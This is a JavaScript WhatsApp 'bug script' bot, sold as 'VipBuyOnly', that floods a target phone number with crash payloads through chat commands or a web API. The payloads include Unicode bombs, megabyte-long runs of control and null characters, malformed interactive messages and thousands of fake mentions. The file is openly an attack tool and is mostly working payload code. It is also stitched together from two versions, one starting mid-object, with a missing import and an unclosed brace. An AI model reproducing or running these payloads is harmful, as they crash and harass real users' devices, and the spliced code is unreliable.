// ============================================================
// BRAMZ WHATSAPP BUG SCRIPT — FIXED
// GPTX 13D — CRASH FIX
// ============================================================

// PASTIKAN DEPENDENSI TERINSTALL!
// npm install @whiskeysockets/baileys pino

const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const pino = require('pino');

// ============================================================
// KONFIGURASI
// ============================================================
const CONFIG = {
    admins: ['6285379307765@s.whatsapp.net']
};

let sock = null;
let isConnected = false;
let botStarting = false;

// ============================================================
// UNICODE BOMB — SIMPLIFIED (Gak pake karakter aneh)
// ============================================================
function generateUnicodeBomb(size) {
    // Pake karakter yang aman — TAPI TETEP GANAS!
    const chars = ['\uA9BE', '\u08EF', '\u{12219}', '\u{E0000}', '\u{E0001}', '\u{E0002}'];
    let result = '';
    for (let i = 0; i < size; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

// ============================================================
// SEND BUG — SIMPLIFIED (Gak pake generateWAMessageFromContent)
// ============================================================
async function sendBug(sock, target, sender) {
    try {
        await sock.sendMessage(sender, { text: '🔥 BRAMZ BUG ACTIVE\nTarget: ' + target });
        
        const bomb = generateUnicodeBomb(50000);
        const memoryBomb = "\x10".repeat(300000);
        
        // Kirim 30 pesan bug
        for (let i = 0; i < 30; i++) {
            try {
                await sock.sendMessage(target, {
                    text: '💀 BRAMZ ' + i + ' ' + bomb.substring(0, 5000) + ' ' + memoryBomb.substring(0, 5000)
                });
            } catch (e) {}
            await new Promise(r => setTimeout(r, 50));
        }
        
        // Kirim juga ke status
        try {
            await sock.sendMessage('status@broadcast', {
                text: '🔥 BRAMZ BUG ' + bomb.substring(0, 5000)
            });
        } catch (e) {}
        
        await sock.sendMessage(sender, { text: '✅ BUG SENT!' });
        return true;
    } catch (e) {
        try {
            await sock.sendMessage(sender, { text: '❌ Error: ' + e.message });
        } catch (err) {}
        return false;
    }
}

// ============================================================
// MESSAGE HANDLER
// ============================================================
async function handleMessage(sock, msg, sender, isGroup) {
    try {
        const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
        if (!text) return;
        
        const cmd = text.toLowerCase().trim();
        console.log('📨', sender, ':', text);
        
        // MENU
        if (cmd === '.menu' || cmd === '.help') {
            await sock.sendMessage(sender, {
                text: '「 BRAM 」\n࿇ ᴀᴜᴛᴏʀ : @Bramz\n࿇ ᴛɪᴘᴏ  : 1.0 VipBuyOnly\n\n📋 COMMANDS:\n.bug [number] — Send bug\n.ping — Check bot\n.status — Bot status\n.menu — This menu'
            });
            return;
        }
        
        // PING
        if (cmd === '.ping') {
            await sock.sendMessage(sender, { text: '🏓 PONG! Bot is active' });
            return;
        }
        
        // STATUS
        if (cmd === '.status') {
            await sock.sendMessage(sender, {
                text: '✅ BOT ONLINE\nConnected: ' + (isConnected ? 'YES' : 'NO')
            });
            return;
        }
        
        // .BUG [NUMBER]
        if (cmd.startsWith('.bug ')) {
            const target = cmd.replace('.bug ', '').trim();
            if (!target || target.length < 10) {
                await sock.sendMessage(sender, { text: '❌ Format: .bug 6281234567890' });
                return;
            }
            let targetJid = target.includes('@') ? target : target + '@s.whatsapp.net';
            await sock.sendMessage(sender, { text: '☢️ Sending bug to ' + target });
            setTimeout(async () => await sendBug(sock, targetJid, sender), 100);
            return;
        }
        
        // AUTO-REPLY
        if (!isGroup) {
            await sock.sendMessage(sender, { text: '🤖 Bot aktif! Ketik .menu' });
        }
        
    } catch (e) {
        console.error('Handler error:', e.message);
    }
}

// ============================================================
// START BOT
// ============================================================
async function startBot() {
    if (botStarting) {
        console.log('⏳ Bot already starting...');
        return null;
    }
    
    botStarting = true;
    console.log('🔥 BRAMZ BOT STARTING...');
    
    try {
        const { state, saveCreds } = await useMultiFileAuthState('auth');
        sock = makeWASocket({
            auth: state,
            printQRInTerminal: true,
            browser: ['BRAMZ', 'Chrome', '13.0'],
            logger: pino({ level: 'silent' })
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', ({ connection, qr, lastDisconnect }) => {
            if (qr) {
                console.log('📱 SCAN QR CODE:');
                console.log(qr);
                console.log('\n📱 Buka WhatsApp → Link Devices → Scan QR\n');
            }
            
            if (connection === 'open') {
                isConnected = true;
                botStarting = false;
                console.log('✅ BOT CONNECTED!');
                console.log('💀 BRAMZ ACTIVE');
                console.log('📋 Ketik .menu di WhatsApp');
            }
            
            if (connection === 'close') {
                isConnected = false;
                botStarting = false;
                console.log('❌ Disconnected');
                setTimeout(startBot, 5000);
            }
        });
        
        sock.ev.on('messages.upsert', async ({ messages }) => {
            try {
                const msg = messages[0];
                if (!msg.message || msg.key.fromMe || !msg.key.remoteJid) return;
                const sender = msg.key.remoteJid;
                const isGroup = sender.includes('@g.us');
                const senderJid = isGroup ? msg.key.participant : sender;
                if (senderJid) await handleMessage(sock, msg, senderJid, isGroup);
            } catch (e) {}
        });
        
        return sock;
        
    } catch (e) {
        console.error('Start error:', e.message);
        botStarting = false;
        setTimeout(startBot, 10000);
        return null;
    }
}

// ============================================================
// MAIN API HANDLER — SIMPLIFIED
// ============================================================
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    try {
        const { command, target, start, ping } = req.query;
        
        // PING — TEST API
        if (ping === 'true') {
            return res.json({
                status: 'pong',
                author: 'Bramz',
                connected: isConnected,
                time: new Date().toISOString()
            });
        }
        
        // START BOT
        if (start === 'true' || command === 'start') {
            if (isConnected && sock) {
                return res.json({ status: 'ALREADY RUNNING', connected: true });
            }
            await startBot();
            return res.json({ 
                status: 'STARTED', 
                message: 'Bot starting! Check terminal for QR code.',
                connected: isConnected 
            });
        }
        
        // SEND BUG VIA API
        if (command === 'bug' && target) {
            if (!isConnected || !sock) {
                return res.json({ status: 'ERROR', error: 'Bot not connected. Start bot first!' });
            }
            let targetJid = target.includes('@') ? target : target + '@s.whatsapp.net';
            const result = await sendBug(sock, targetJid, targetJid);
            return res.json({ status: result ? 'BUG SENT' : 'ERROR', target: target });
        }
        
        // DEFAULT
        res.json({
            status: 'READY',
            author: 'Bramz',
            version: '1.0',
            connected: isConnected,
            commands: ['.menu', '.bug [number]', '.ping', '.status']
        });
        
    } catch (e) {
        res.status(500).json({
            status: 'ERROR',
            error: e.message,
            stack: e.stack
        });
    }
};

// ============================================================
// RUN IF DIRECT
// ============================================================
if (require.main === module) {
    startBot();
}     { name: "single_select", buttonParamsJson: "" },
                                { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "\uA9BE".repeat(5000) }) },
                                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "\uA9BE".repeat(5000) }) },
                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "\uA9BE".repeat(5000) }) },
                            ],
                            messageParamsJson: "[{".repeat(10000),
                        },
                        contextInfo: {
                            participant: target,
                            mentionJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net"),
                            ],
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimeStamp: Date.now() + 1814400000,
                                },
                            },
                        },
                    },
                },
            },
        };

        await sock.relayMessage(target, msg2, {
            messageId: null,
            participant: { jid: target },
        });
        
        return true;
    } catch (e) {
        console.error('VtxBlankAndroVersi1 error:', e.message);
        return false;
    }
}

// ============================================================
// PAYLOAD — VXZYXFC
// ============================================================
async function VxzyXFC(sock, target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 3,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 99999999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: `BramzyIsHere🤙😜${"\uA9C0".repeat(2500)}.com - _ #`
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                            buttons: Array(6).fill().map(() => ({
                                name: Math.random() > 0.5 ? "mpm" : "single_select",
                                buttonParamsJson: ""
                            }))
                        },
                    },
                },
            },
        };

        await sock.relayMessage(target, message, {
            participant: { jid: target },
        });
        
        return true;
    } catch (e) {
        console.error('VxzyXFC error:', e.message);
        return false;
    }
}

// ============================================================
// PAYLOAD — TES100
// ============================================================
async function tes100(sock, target) {
    try {
        const unicodeBomb = generateUnicodeBomb(80000);
        
        const viewOnceMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                        fileLength: "99999999999999999",
                        height: "9999999999999999",
                        width: "9999999999999999",
                        mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                        fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                        directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "172519628",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyEiIzFRMjNBYQBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
                        streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
                        caption: unicodeBomb,
                        contextInfo: {
                            stanzaId: "Thumbnail.id",
                            isForwarded: true,
                            forwardingScore: 999,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, {});

        const Payment_Info = generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                body: { text: "Ondet Onde X", format: "DEFAULT" },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: "\u0000".repeat(1045000),
                    version: 3
                }
            }
        }, {});

        await sock.relayMessage("status@broadcast", viewOnceMsg.message, {
            messageId: viewOnceMsg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
        
        await sock.relayMessage("status@broadcast", Payment_Info.message, {
            messageId: Payment_Info.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
        
        return true;
    } catch (e) {
        console.error('tes100 error:', e.message);
        return false;
    }
}

// ============================================================
// PAYLOAD — ATUT
// ============================================================
async function Atut(sock, target) {
    try {
        const OndetMsg1 = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "B = BOKEP⟅༑", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });

        const OndetMsg2 = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "K = KONTOL ᝄ", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });

        await sock.relayMessage("status@broadcast", OndetMsg1.message, {
            messageId: OndetMsg1.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });

        await sock.relayMessage("status@broadcast", OndetMsg2.message, {
            messageId: OndetMsg2.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });
        
        return true;
    } catch (e) {
        console.error('Atut error:', e.message);
        return false;
    }
}

// ============================================================
// PAYLOAD — INVISIBLEDK
// ============================================================
async function Invisibledk(sock, target) {
    try {
        const msg = {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
                fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                mimetype: "image/webp",
                height: 9999,
                width: 9999,
                directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                fileLength: 12260,
                mediaKeyTimestamp: "1743832131",
                isAnimated: false,
                stickerSentTs: "X",
                isAvatar: false,
                isAiSticker: false,
                isLottie: false,
                contextInfo: {
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
                    ],
                    stanzaId: "1234567890ABCDEF",
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        }
                    }
                }
            }
        };

        await sock.relayMessage("status@broadcast", msg, {
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });
        
        return true;
    } catch (e) {
        console.error('Invisibledk error:', e.message);
        return false;
    }
}

// ============================================================
// SEND ALL BUGS
// ============================================================
async function sendAllBugs(sock, target, sender) {
    try {
        await sock.sendMessage(sender, { text: '🔥 BRAMZ BUG SCRIPT ACTIVE\nTarget: ' + target });
        
        // Kirim semua payload
        await VtxBlankAndroVersi1(sock, target);
        await new Promise(r => setTimeout(r, 100));
        
        await VxzyXFC(sock, target);
        await new Promise(r => setTimeout(r, 100));
        
        await tes100(sock, target);
        await new Promise(r => setTimeout(r, 100));
        
        await Atut(sock, target);
        await new Promise(r => setTimeout(r, 100));
        
        await Invisibledk(sock, target);
        
        await sock.sendMessage(sender, { text: '✅ ALL BUGS SENT!' });
        
    } catch (e) {
        await sock.sendMessage(sender, { text: '❌ Error: ' + e.message });
    }
}

// ============================================================
// MESSAGE HANDLER
// ============================================================
async function handleMessage(sock, msg, sender, isGroup) {
    try {
        const text = msg.message?.conversation ||
                     msg.message?.extendedTextMessage?.text ||
                     '';
        
        if (!text) return;
        
        const cmd = text.toLowerCase().trim();
        
        console.log('📨', sender, ':', text);
        
        // ============================================================
        // MENU
        // ============================================================
        if (cmd === '.menu' || cmd === '.help') {
            const menu = `
「 BRAM 」
࿇ ᴀᴜᴛᴏʀ : @Bramz
࿇ ᴛɪᴘᴏ  : 1.0 VipBuyOnly
࿇ sᴄʀɪᴘᴛ  : Database A- Flows

⦏ 𝗠𝗘𝗡𝗨 𝗗𝗔𝗧𝗔𝗕𝗦𝗘 ⦐
│ꔹ addbot
│ꔹ listbot
│ꔹ delbot
│ꔹ ckey
│ꔹ listkey
│ꔹ delkey
│ꔹ addsender 
│ꔹ adp 
╰─────────────

⦏ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 ⦐
│ꔹ addacces
│ꔹ delacces
│ꔹ addowner
│ꔹ delowner
│ꔹ addreseller
│ꔹ delreseller
│ꔹ addpt
│ꔹ delpt
│ꔹ addmod
│ꔹ delmod
╰─────────────

⦏ 𝗕𝗨𝗚 𝗦𝗖𝗥𝗜𝗣𝗧 ⦐
│ꔹ .bug [number] — Send all bugs
│ꔹ .ping — Check bot
│ꔹ .status — Bot status
╰─────────────
`;
            await sock.sendMessage(sender, { text: menu });
            return;
        }
        
        // ============================================================
        // PING
        // ============================================================
        if (cmd === '.ping') {
            await sock.sendMessage(sender, { text: '🏓 PONG! Bot is active' });
            return;
        }
        
        // ============================================================
        // STATUS
        // ============================================================
        if (cmd === '.status') {
            await sock.sendMessage(sender, {
                text: '✅ BOT ONLINE\nAuto-reply: ON\nBug Engine: READY\nConnected: ' + (isConnected ? 'YES' : 'NO')
            });
            return;
        }
        
        // ============================================================
        // .BUG [NUMBER]
        // ============================================================
        if (cmd.startsWith('.bug ')) {
            const target = cmd.replace('.bug ', '').trim();
            
            if (!target || target.length < 10) {
                await sock.sendMessage(sender, { text: '❌ Format: .bug 6281234567890' });
                return;
            }
            
            let targetJid = target.includes('@') ? target : target + '@s.whatsapp.net';
            
            await sock.sendMessage(sender, { text: '☢️ Sending bugs to ' + target });
            
            setTimeout(async () => {
                await sendAllBugs(sock, targetJid, sender);
            }, 100);
            return;
        }
        
        // ============================================================
        // AUTO-REPLY
        // ============================================================
        if (CONFIG.autoReply && !isGroup) {
            await sock.sendMessage(sender, {
                text: '🤖 Bot aktif! Ketik .menu untuk daftar perintah'
            });
        }
        
    } catch (e) {
        console.error('Handler error:', e.message);
    }
}

// ============================================================
// START BOT
// ============================================================
let reconnectAttempts = 0;

async function startBot() {
    console.log('🔥 BRAMZ WHATSAPP BUG SCRIPT');
    console.log('╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮');
    console.log('Starting bot...\n');
    
    try {
        const { state, saveCreds } = await useMultiFileAuthState('auth');
        sock = makeWASocket({
            auth: state,
            printQRInTerminal: true,
            browser: ['BRAMZ BUG', 'Chrome', '13.0'],
            logger: pino({ level: 'silent' })
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', ({ connection, qr, lastDisconnect }) => {
            if (qr) {
                console.log('📱 SCAN QR CODE:');
                console.log(qr);
                console.log('\n📱 Buka WhatsApp → Link Devices → Scan QR\n');
                reconnectAttempts = 0;
            }
            
            if (connection === 'open') {
                isConnected = true;
                console.log('✅ BOT CONNECTED!');
                console.log('💀 BRAMZ BUG SCRIPT ACTIVE');
                console.log('📋 Ketik .menu di WhatsApp\n');
                reconnectAttempts = 0;
            }
            
            if (connection === 'close') {
                isConnected = false;
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                console.log('❌ Disconnected:', statusCode);
                
                const delay = Math.min(5000 + (reconnectAttempts * 2000), 30000);
                console.log('🔄 Reconnecting in', delay/1000, 's');
                setTimeout(startBot, delay);
                reconnectAttempts++;
            }
        });
        
        sock.ev.on('messages.upsert', async ({ messages }) => {
            try {
                const msg = messages[0];
                if (!msg.message) return;
                if (msg.key.fromMe) return;
                if (!msg.key.remoteJid) return;
                
                const sender = msg.key.remoteJid;
                const isGroup = sender.includes('@g.us');
                const senderJid = isGroup ? msg.key.participant : sender;
                
                if (senderJid) {
                    await handleMessage(sock, msg, senderJid, isGroup);
                }
            } catch (e) {
                console.error('Message error:', e.message);
            }
        });
        
        return sock;
        
    } catch (e) {
        console.error('Start error:', e.message);
        console.log('🔄 Restarting in 10s...');
        setTimeout(startBot, 10000);
        return null;
    }
}

// ============================================================
// MAIN API HANDLER — VERCEL
// ============================================================
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    const { command, target, ping, start } = req.query;
    
    try {
        // Ping
        if (ping === 'true') {
            return res.json({
                status: 'pong',
                author: 'Bramz',
                bot_connected: isConnected,
                version: '1.0'
            });
        }
        
        // Start bot
        if (start === 'true' || command === 'start') {
            if (isConnected && sock) {
                return res.json({
                    status: 'BOT ALREADY RUNNING',
                    author: 'Bramz',
                    message: 'Bot sudah berjalan!'
                });
            }
            
            await startBot();
            return res.json({
                status: 'BOT STARTED',
                author: 'Bramz',
                message: 'Bot WhatsApp aktif! Scan QR Code di terminal.',
                connected: isConnected
            });
        }
        
        // Bug via API
        if (command === 'bug' && target) {
            if (!isConnected || !sock) {
                return res.json({
                    status: 'ERROR',
                    error: 'Bot not connected. Start bot first!',
                    author: 'Bramz'
                });
            }
            
            let targetJid = target;
            if (!targetJid.includes('@')) {
                targetJid = targetJid + '@s.whatsapp.net';
            }
            
            const result = await sendAllBugs(sock, targetJid, targetJid);
            return res.json({
                status: 'BUGS SENT',
                author: 'Bramz',
                target: target,
                result: result
            });
        }
        
        // Default
        res.json({
            status: 'READY',
            author: 'Bramz',
            version: '1.0',
            commands: [
                '.menu — Daftar perintah',
                '.bug [number] — Kirim bug ke target',
                '.ping — Cek koneksi',
                '.status — Cek status bot'
            ],
            bot_connected: isConnected,
            deploy: 'https://bram-bug.vercel.app/'
        });
        
    } catch (e) {
        res.json({
            status: 'ERROR',
            error: e.message,
            author: 'Bramz'
        });
    }
};

// ============================================================
// RUN
// ============================================================
if (require.main === module) {
    startBot();
              }
